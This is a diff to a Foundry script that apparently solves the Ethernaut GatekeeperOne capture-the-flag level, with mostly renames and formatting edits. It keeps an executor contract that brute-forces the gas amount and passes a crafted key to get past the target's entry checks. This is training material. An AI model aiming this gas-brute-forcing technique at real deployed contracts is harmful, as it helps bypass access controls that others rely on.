@@ -2,14 +2,13 @@
 pragma solidity ^0.8.0;
 
 import {Script, console} from "forge-std/Script.sol";
-import {GatekeeperOne} from "../src/GatekeeperOne.sol";             
+import {GatekeeperOne} from "../src/GatekeeperOne.sol";
 
 contract GatekeeperOneScript is Script {
-
     GatekeeperOne internal gatekeeperOne;
 
     constructor() {
-        gatekeeperOne = GatekeeperOne(vm.envAddress("GATEKEEPER_INSTANCE"));
+        gatekeeperOne = GatekeeperOne(vm.envAddress("GATEKEEPER_ONE_INSTANCE"));
     }
 
     function run() public {
@@ -28,10 +27,7 @@ contract GatekeeperOneScript is Script {
 
         vm.startBroadcast(pk);
         //gatekeeperOne = new GatekeeperOne();
-        new ElevatorExecutor(
-            gatekeeperOne, 
-            key
-        );
+        new GatekeeperOneExecutor(gatekeeperOne, key);
         console.log("Owner: ", gatekeeperOne.entrant());
         vm.stopBroadcast();
     }
@@ -39,11 +35,12 @@ contract GatekeeperOneScript is Script {
     // forge script script/gatekeeperOne.s.sol:GatekeeperOneScript --broadcast
 }
 
-contract ElevatorExecutor {
+contract GatekeeperOneExecutor {
     constructor(GatekeeperOne gatekeeperOne, bytes8 key) {
-        for (uint256 i; true; i++)
-            try gatekeeperOne.enter{gas: 8191*3 + i}(key) {
+        for (uint256 i; true; i++) {
+            try gatekeeperOne.enter{gas: 8191 * 3 + i}(key) {
                 break;
             } catch {}
+        }
     }
 }
